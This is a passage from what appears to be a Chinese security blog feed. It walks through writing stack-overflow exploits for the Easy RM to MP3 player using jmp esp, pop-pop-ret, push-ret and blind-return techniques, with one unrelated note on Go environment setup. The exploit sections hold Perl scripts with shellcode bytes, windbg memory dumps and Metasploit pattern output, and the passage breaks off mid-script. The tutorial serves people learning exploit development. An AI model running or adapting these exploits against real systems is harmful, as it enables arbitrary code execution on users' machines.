<p>果然成功如我们所料，EIP成功的断在了0x000ffd39处，说明我们找到的JMP ESP是有效的</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201213213613001.png" class="" title="image-20201213213613001">

<p>但是现在这个payload只是一堆字符，什么都做不了，接下来我们只需要将payload替换为真正有效的payload即可。</p>
<pre><code class="perl">my $file= "test4.m3u";
my $junk= "A" x 26067;
my $eip = pack('V',0x01b9f23a); #overwrite EIP with call esp
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\x90" x 25; #start shellcode with some NOPS
$shellcode = $shellcode .
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>完成</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%971-Easy-RM-to-MP3-%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95/image-20201220161353741.png" class="" title="image-20201220161353741">
]]></content>
      <categories>
        <category>Win逆向</category>
      </categories>
      <tags>
        <tag>exploit编写</tag>
        <tag>溢出类型漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>go环境变量设置</title>
    <url>/2021/05/20/go%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/</url>
    <content><![CDATA[<h3 id="question："><a href="#question：" class="headerlink" title="question："></a>question：</h3><ul>
<li>linux下设置go环境变量之后，再次打开新的终端或者重启后环境变量会失效需要重新<code>source /etc/profile</code> 后才能生效</li>
</ul>
<span id="more"></span>

<h3 id="answer："><a href="#answer：" class="headerlink" title="answer："></a>answer：</h3><ul>
<li>原来在 <code>/etc/profile</code> 中写入的环境变量输出的是普通用户的环境变量，设置root用户的环境变量需要在<code>/root/.bashrc</code> 里面写入环境变量（将刚才在 <code>/etc/profile</code> 中写入的环境变量拷贝过来重新 <code>source /root/.bashrc</code> 即可）</li>
<li>然后无论是重启还是打开新的终端无论是普通用户还是root用户输入 <code>go env</code> 就可以看到我们设置好的环境变量生效。</li>
</ul>
<img src="/2021/05/20/go%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E8%AE%BE%E7%BD%AE/image-20200418165608857.png" class="" title="image-20200418165608857">

]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>环境配置</tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>exploit编写系列2：栈溢出，跳转至shellcode</title>
    <url>/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/</url>
    <content><![CDATA[<h1 id="exploit编写系列2：栈溢出，跳转至shellcode"><a href="#exploit编写系列2：栈溢出，跳转至shellcode" class="headerlink" title="exploit编写系列2：栈溢出，跳转至shellcode"></a>exploit编写系列2：栈溢出，跳转至shellcode</h1><p>这篇blog是为了学习如何用各种方式去构造栈溢出类型漏洞的exp</p>
<p>执行shellcode的多种方法：</p>
<ol>
<li>jump/call	寄存器</li>
<li>pop return</li>
<li>push return</li>
<li>jmp[reg + offset]</li>
<li>blind return</li>
<li>jmp code</li>
<li>SHE</li>
<li>call</li>
</ol>
<span id="more"></span>

<hr>
<h3 id="1-jmp-x2F-call-寄存器"><a href="#1-jmp-x2F-call-寄存器" class="headerlink" title="1. jmp/call 寄存器"></a>1. jmp/call 寄存器</h3><p>在第一篇中已经详细分析过</p>
<h3 id="2-pop-pop-ret"><a href="#2-pop-pop-ret" class="headerlink" title="2. pop pop ret"></a>2. pop pop ret</h3><p>这个exp我们依然还使用上一篇分析的Easy RM to MP3的漏洞来编写，在上一章使用jmp register 编写exp的时候，我们已经能够调整缓冲区，使ESP直接指向我们的shellcode。但是如果shellcode入口发生偏移比如：shellcode的入口位于ESP+8的时候，我们又该怎么去编写exp呢？理论上，当ESP+offset已经包含shellcode地址，那么只有pop ret这种方法使可行的….如果不是如此（事情往往并非如此），那么也许还有其他方法。</p>
<p>接下来我们尝试采用pop pop ret的方式来重新调整一下shellcode，在上一章的调试中我们已经知道了覆盖EIP需要26067byte，另外在ESP指向的栈地址（0x000ffd38）前还需要4byte。为了模拟出shellcode起始于ESP+8的假象，我们需要构造出一块栈情况如下的缓冲区：</p>
<p>26067xA，XXXX，INT3中断，7NOP，INT3中断，后面放一些NOP。</p>
<p>这样排列我们就可以将真正的shellcode放置于ESP+8后。</p>
<p>先按上面的思路编写一下我们的shellcode</p>
<pre><code class="perl">my $file= "test1.m3u";
my $junk= "A" x 26067;
my $eip = "BBBB"; #overwrite EIP
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\xcc"; #first break
$shellcode = $shellcode . "\x90" x 7; #add 7 more bytes
$shellcode = $shellcode . "\xcc"; #second break
$shellcode = $shellcode . "\x90" x 500; #real shellcode
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>用Easy RM to MP3打开生成的test1.m3u，中断之后查看一下堆栈，现在中断于EIP我们填写的”BBBB”处，输入<code>d esp</code>查看一下栈的排列，esp指向0x000ffd38处，里面的内容跟我们刚来编写的代码一致：0xCC + 7个0x90 + 0xCC + 500个0x90（shellcode）</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20201229004417938-1621477705987.png" class="" title="image-20201229004417938">

<p>为了让EIP直接跳往EIP+8（我们的payload处），我们需要使用pop ret技术+jmp esp地址来完成此项任务。</p>
<p>一个pop指令可以将栈顶弹出四个byte，我们需要两个pop指令就可以将ESP+8（0x000ffd38+8 = 0x000ffd40）,此时再执行ret指令就会将当前ESP的值（0x000ffd40）赋予EIP。如果在此时的ESP（0x000ffd40)处包含有jmp esp指令的地址，那么此时EIP就将会执行jmp esp指令跳转到此时的ESP（0x000ffd40)处，这样的话我们就必须把我们的shellcode放置在0x000ffd40后面的缓冲区中。</p>
<p>接下来我们需要先找到一个可用的pop pop ret指令的地址，用这串指令的首地址来覆盖EIP，然后在ESP+8处放入jmp esp指令的地址，再后面紧跟着的就是shellcode了。</p>
<p>重新打开Easy RM to MP3然后使用windbg附加进程，使用windbg的汇编功能来搜索一下 pop pop ret指令的位置</p>
<pre><code>ntdll!DbgBreakPoint:
7c92120e cc              int     3
0:010&gt; a
7c92120e pop eax
pop eax
7c92120f pop ebp
pop ebp
7c921210 ret
ret
7c921211 

0:010&gt; u 7c92120e 
ntdll!DbgBreakPoint:
7c92120e 58              pop     eax
7c92120f 5d              pop     ebp
7c921210 c3              ret
7c921211 ffcc            dec     esp
7c921213 c3              ret
7c921214 8bff            mov     edi,edi
7c921216 8b442404        mov     eax,dword ptr [esp+4]
7c92121a cc              int     3
</code></pre>
<p>我们可以查到pop eax, pop ebx, ret三条指令对应的机器码为：0x58 0x5d 0xc3</p>
<p>然后我们可以在加载的DLL里面查找包含这三条指令的地址</p>
<p>重新打开windbg并加载Easy RM to MP3</p>
<p>在加载的DLL里面搜索我们需要的指令，这里关于DLL的选择如果每次DLL加载的基址都相同的话我们就选择应用程序的DLL如果每次加载的基址都会改变的话，就选择系统的DLL会更好点</p>
<p>需要注意的是我们选择的地址尽量不要包含有”00”</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20201231000901339-1621477705987.png" class="" title="image-20201231000901339">

<p>现在我们可以使用上面搜索到的地址让我们跳转到ESP+8，现在我们需要在ESP+8处填入jmp esp的地址（前面解释过，ret指令将从这里获取地址，并将其赋值给EIP执行）。</p>
<p>用同样的方法来搜索一下 jmp esp的地址</p>
<pre><code>0:010&gt; s 01940000 l 019b1000   ff e4
01b7f23a  ff e4 ff 8d 4e 10 c7 44-24 10 ff ff ff ff e8 f3  ....N..D$.......
01bb023f  ff e4 fb 4d 1b a6 9c ff-ff 54 a2 ea 1a d9 9c ff  ...M.....T......
01bcd3db  ff e4 ca b9 01 20 05 93-19 09 00 00 00 00 d4 bc  ..... ..........
01beb22a  ff e4 07 07 f2 01 57 f2-5d 1c d3 e8 09 22 d5 d0  ......W.]...."..
01beb72d  ff e4 09 7d e4 ad 37 df-e7 cf 25 23 c9 a0 4a 26  ...}..7...%#..J&amp;
</code></pre>
<p>此时我们可以将EIP执行到ESP指向的位置了，接下来我们需要用真正的shellcode替换掉原来的500个NOP。</p>
<p>替换后的缓冲区情况如下：</p>
<table>
<thead>
<tr>
<th>AAAAAAAAAAAAAAAAAA…</th>
<th>0x01966a10</th>
<th>NOP NPO</th>
<th>0x01b7f23a</th>
<th>SHELLCODE</th>
</tr>
</thead>
<tbody><tr>
<td>26067</td>
<td>EIP</td>
<td>8 BYTE OFFSET</td>
<td>JMP ESP</td>
<td></td>
</tr>
<tr>
<td></td>
<td>POP POP RET</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p>现在我们构造的exp执行情况如下：</p>
<ol>
<li>EIP被pop pop ret 指令的地址覆盖，ESP会指向shellcode偏移8字节的地址；</li>
<li>pop pop ret被执行之后，EIP会被ESP+8处的（jmp esp）0x01b7f23a指令覆盖，ESP指向shellcode；</li>
<li>由于EIP被jmp esp指令的地址覆盖，因此程序会跳转到shellcode执行。</li>
</ol>
<pre><code class="perl">my $file= "test3.m3u";
my $junk= "A" x 26067;
my $eip = pack('V',0x01966a10); #overwrite EIP
my $jmpesp = pack('V',0x01b7f23a);
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
#my $shellcode = "\xcc"; #first break
$shellcode = "\x90" x 8; #add 7 more bytes
$shellcode = $shellcode . $jmpesp; #second break

$shellcode = $shellcode . "\x90" x 50; #real shellcode
$shellcode = $shellcode . 
"\x89\xe2\xda\xc1\xd9\x72\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x4a" .
"\x48\x50\x44\x43\x30\x43\x30\x45\x50\x4c\x4b\x47\x35\x47" .
"\x4c\x4c\x4b\x43\x4c\x43\x35\x43\x48\x45\x51\x4a\x4f\x4c" .
"\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x47\x50\x43\x31\x4a" .
"\x4b\x51\x59\x4c\x4b\x46\x54\x4c\x4b\x43\x31\x4a\x4e\x50" .
"\x31\x49\x50\x4c\x59\x4e\x4c\x4c\x44\x49\x50\x43\x44\x43" .
"\x37\x49\x51\x49\x5a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4a" .
"\x54\x47\x4b\x51\x44\x46\x44\x43\x34\x42\x55\x4b\x55\x4c" .
"\x4b\x51\x4f\x51\x34\x45\x51\x4a\x4b\x42\x46\x4c\x4b\x44" .
"\x4c\x50\x4b\x4c\x4b\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x4c" .
"\x4b\x45\x4c\x4c\x4b\x45\x51\x4a\x4b\x4d\x59\x51\x4c\x47" .
"\x54\x43\x34\x48\x43\x51\x4f\x46\x51\x4b\x46\x43\x50\x50" .
"\x56\x45\x34\x4c\x4b\x47\x36\x50\x30\x4c\x4b\x51\x50\x44" .
"\x4c\x4c\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x45\x38\x43" .
"\x38\x4b\x39\x4a\x58\x4c\x43\x49\x50\x42\x4a\x50\x50\x42" .
"\x48\x4c\x30\x4d\x5a\x43\x34\x51\x4f\x45\x38\x4a\x38\x4b" .
"\x4e\x4d\x5a\x44\x4e\x46\x37\x4b\x4f\x4d\x37\x42\x43\x45" .
"\x31\x42\x4c\x42\x43\x45\x50\x41\x41";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>成功的执行了shellcode弹出了计算器</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20201231004613153-1621477705987.png" class="" title="image-20201231004613153">

<h3 id="3-push-return"><a href="#3-push-return" class="headerlink" title="3. push return"></a>3. push return</h3><p>push ret与call [reg]有些相似，如果有个寄存器指向你的shellcode，但是由于某些原因你无法使用jmp[reg]去跳转到shellcode，可以采用：</p>
<ul>
<li>将寄存器地址压入栈中，它将位于栈顶</li>
<li>ret（从栈中获取返回地址，并跳转到该地址）</li>
</ul>
<p>为了实现这种方法，你需要用某个dll中的push [reg] + ret 指令串地址去覆盖EIP。为了直接将使用的shellcode放入ESP中，你首先需要搜索‘push esp’和‘ret’的机器码。</p>
<h4 id="0x00-重新运行Easy-RM-to-MP3并用windbg附加"><a href="#0x00-重新运行Easy-RM-to-MP3并用windbg附加" class="headerlink" title="0x00 重新运行Easy RM to MP3并用windbg附加"></a>0x00 重新运行Easy RM to MP3并用windbg附加</h4><p>用windbg的汇编搜索功能来寻找一段<code>push esp</code>&amp;<code>ret</code>指令</p>
<pre><code>0:010&gt; a
7c92120f push esp
push esp
7c921210 ret
ret
7c921211 

0:010&gt; u 7c92120f 
ntdll!DbgBreakPoint+0x1:
7c92120f 54              push    esp
7c921210 c3              ret
7c921211 ffcc            dec     esp
7c921213 c3              ret
7c921214 8bff            mov     edi,edi
7c921216 8b442404        mov     eax,dword ptr [esp+4]
7c92121a cc              int     3
7c92121b c20400          ret     4
</code></pre>
<p>可以看到指令对应的机器码为<code>54 c3</code>，然后我们可以从加载的dll里面搜索一条可用的指令地址</p>
<pre><code>0:010&gt; s 01940000 l 019b1000   54 c3
019557f6  54 c3 90 90 90 90 90 90-90 90 8b 44 24 08 85 c0  T..........D$...
01a01d88  54 c3 fe ff 85 c0 74 5d-53 8b 5c 24 30 57 8d 4c  T.....t]S.\$0W.L
01a2cd65  54 c3 8b 87 33 05 00 00-83 f8 06 0f 85 92 01 00  T...3...........
01a2cf2f  54 c3 8b 4c 24 58 8b c6-5f 5e 5d 5b 64 89 0d 00  T..L$X.._^][d...
01a2cf44  54 c3 90 90 90 90 90 90-90 90 90 90 8a 81 da 04  T...............
</code></pre>
<p>选择一个地址，构造exp并运行(直接用call [reg]的exp，将eip修改为我们刚找到的指令地址即可)</p>
<pre><code class="perl">my $file= "test_5.m3u";
my $junk= "A" x 26067;
my $eip = pack('V',0x019557f6); #overwrite EIP with call esp
my $prependesp = "XXXX"; #add 4 bytes so ESP points at beginning of shellcode bytes
my $shellcode = "\x90" x 25; #start shellcode with some NOPS
$shellcode = $shellcode .
"\xdb\xc0\x31\xc9\xbf\x7c\x16\x70\xcc\xd9\x74\x24\xf4\xb1" .
"\x1e\x58\x31\x78\x18\x83\xe8\xfc\x03\x78\x68\xf4\x85\x30" .
"\x78\xbc\x65\xc9\x78\xb6\x23\xf5\xf3\xb4\xae\x7d\x02\xaa" .
"\x3a\x32\x1c\xbf\x62\xed\x1d\x54\xd5\x66\x29\x21\xe7\x96" .
"\x60\xf5\x71\xca\x06\x35\xf5\x14\xc7\x7c\xfb\x1b\x05\x6b" .
"\xf0\x27\xdd\x48\xfd\x22\x38\x1b\xa2\xe8\xc3\xf7\x3b\x7a" .
"\xcf\x4c\x4f\x23\xd3\x53\xa4\x57\xf7\xd8\x3b\x83\x8e\x83" .
"\x1f\x57\x53\x64\x51\xa1\x33\xcd\xf5\xc6\xf5\xc1\x7e\x98" .
"\xf5\xaa\xf1\x05\xa8\x26\x99\x3d\x3b\xc0\xd9\xfe\x51\x61" .
"\xb6\x0e\x2f\x85\x19\x87\xb7\x78\x2f\x59\x90\x7b\xd7\x05" .
"\x7f\xe8\x7b\xca";
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$prependesp.$shellcode;
close($FILE);
print "m3u File Created successfully\n";
</code></pre>
<p>利用成功</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210102172628709-1621477705987.png" class="" title="image-20210102172628709">

<h3 id="4-jmp-reg-offset"><a href="#4-jmp-reg-offset" class="headerlink" title="4. jmp [reg + offset]"></a>4. jmp [reg + offset]</h3><p>如果我们的shellcode再寄存器入口处偏移几个字节的位置，也可以用windbg搜索jmp [reg + offset]指令来跳转过去。</p>
<pre><code>0:010&gt; a
7c92120e jmp [esp+8]
jmp [esp+8]
7c921212 u 7c92120e 
u 7c92120e 
        ^ Bad opcode error in 'u 7c92120e '
7c921212 

0:010&gt; u 7c92120e 
ntdll!DbgBreakPoint:
7c92120e ff642408        jmp     dword ptr [esp+8]
ntdll!DbgUserBreakPoint:
7c921212 cc              int     3
7c921213 c3              ret
7c921214 8bff            mov     edi,edi
7c921216 8b442404        mov     eax,dword ptr [esp+4]
7c92121a cc              int     3
7c92121b c20400          ret     4
</code></pre>
<p>看结果我们可以知道jmp [esp+8]对应的机器码为<code>ff642408</code>，我们可以尝试再其它的dll中搜索包含这条指令的地址，不过我搜索了几个dll没有搜索到这条指令</p>
<h3 id="5-Blind-return"><a href="#5-Blind-return" class="headerlink" title="5. Blind return"></a>5. Blind return</h3><p>此利用主要用于在ESP寄存器指向地址可用字节数不多的情况下，设置跳板跳往可以足够容纳我们shellcode地址的地方去执行的方法。</p>
<p>此项技术基于以下步骤：</p>
<ul>
<li>利用ret指令地址覆写EIP</li>
<li>在ESP首4字节中对shellcode地址进行硬编码</li>
<li>当ret执行时，新添加的4字节（最顶端的值）将从栈中弹出，并赋予EIP</li>
<li>exploit跳至shellcode执行</li>
</ul>
<p>因此这种方法在以下情况是可用的：</p>
<ul>
<li>无法将EIP直接指向某寄存器（因为无法使用jmp或call指令，这意味着你需要对shellcode起始地址进行硬编码）</li>
<li>可控制ESP中的数据（至少能控制前四字节）</li>
</ul>
<p>如果我们想要实现上面的利用方法：</p>
<p>需要拥有shellcode的内存地址（即ESP地址）。</p>
<ol start="2">
<li>在DLL中查找到‘ret’指令的地址</li>
</ol>
<p>先生成一个测试文件来模拟一下堆栈空间</p>
<p>26067个字节A覆盖eip之前的位置+四个字节B覆盖eip + 50个字节的X来作为我们放置跳转指令的地址 + 一段不可用的null</p>
<pre><code class="perl">my $file= "blind_return_1.m3u";
my $junk= "A" x 26067;
my $eip = "BBBB";
my $preshellcode = "X" x 54; #let's pretend this is the only space we have available
my $nop = "\x90" x 230; #added some nops to visually separate our 54 X's from other data
open($FILE,"&gt;$file");
print $FILE $junk.$eip.$preshellcode.$nop;
close($FILE);
</code></pre>
<p>A’s地址距离ESP的偏移</p>
<img src="/2021/05/20/exploit%E7%BC%96%E5%86%99%E7%B3%BB%E5%88%972%EF%BC%9A%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%8C%E8%B7%B3%E8%BD%AC%E8%87%B3shellcode/image-20210112215736411-1621477705987.png" class="" title="image-20210112215736411">

<p>继续往后查看内存，可以看到在ESP+281之后有大段的我们写入的A字符，这表明我们可以使用这段地址来放置我们的shellcode，在X’s位置设置跳转来跳往A’s地址处</p>
<pre><code>eax=00000001 ebx=00104a58 ecx=7c93003d edx=00000004 esi=77c2fce0 edi=000066f3
eip=42424242 esp=000ffd38 ebp=00104678 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000216
42424242 ??              ???
0:000&gt; d esp
000ffd38  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ffd48  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ffd58  58 58 58 58 58 58 58 58-58 58 58 58 58 58 58 58  XXXXXXXXXXXXXXXX
000ffd68  58 58 90 90 90 90 90 90-90 90 90 90 90 90 90 90  XX..............
000ffd78  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffd88  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffd98  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffda8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ffdb8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffdc8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffdd8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffde8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffdf8  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe08  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe18  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe28  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
0:000&gt; d
000ffe38  90 90 90 90 90 90 90 90-90 90 90 90 90 90 90 90  ................
000ffe48  90 90 90 90 90 90 90 90-00 41 41 41 41 41 41 41  .........AAAAAAA
000ffe58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe78  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffe98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffea8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
000ffeb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffec8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffed8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffee8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffef8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
000fff38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff78  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff88  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fff98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fffa8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
000fffb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fffc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fffd8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000fffe8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
000ffff8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00100008  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00100018  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00100028  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0:000&gt; d
00100038  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
</code></pre>
<p>现在我们如果想要往字符‘A’的地址放置我们的shellcode的话需要确定ESP+281处的字符‘A’位于我们写入的26067个‘A’的具体位置，这样我们才可以将shellcode防止合适的位置</p>
<ul>
<li>用pattern_create.rb工具来生成1000个字节的字符模型来替换A的前1000个字节。</li>
</ul>
<pre><code>kali@kali:/usr/share/metasploit-framework/tools/exploit$ ./pattern_create.rb -l 1000
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2B
kali@kali:/usr/share/metasploit-framework/tools/exploit$ 
</code></pre>
<p>编写perl脚本，生成测试文件</p>
<pre><code class="perl">my $file= "blind_return_2.m3u";
